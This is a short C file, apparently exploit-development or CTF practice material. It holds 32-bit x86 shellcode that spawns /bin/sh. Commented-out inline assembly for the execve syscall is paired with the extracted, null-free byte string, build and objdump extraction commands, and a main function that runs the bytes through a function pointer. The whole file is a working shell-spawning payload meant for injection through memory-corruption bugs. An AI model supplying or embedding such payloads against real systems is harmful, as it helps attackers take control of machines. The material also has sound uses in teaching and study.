#include <unistd.h>

/* void getShell() */
/* { */
	/* __asm__("xor edx, edx;" */
			/* "push edx;"	 */
			/* "push 0x68732f2f;" */
			/* "push 0x6e69622f;" */
			/* "mov ebx, esp;" */
			/* "push edx;" */
			/* "push ebx;" */
			/* "mov ecx, esp;" */
			/* "mov eax, 0xffffffff;" */
			/* "sub eax, 0xfffffff4;" */
			/* "int 0x80;" */
			/* ); */
/* } */
/* gcc shell_asm.c -m32 -masm=intel -o shell_asm */
/* objdump -d ./shell_asm| cut -f2 > shellcode */

char *shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb8\xff\xff\xff\xff\x83\xe8\xf4\xcd\x80";

int main()
{
	/* getShell();  */
	void(*exp)();
	exp = &shellcode;
	exp();
	return 0;
}
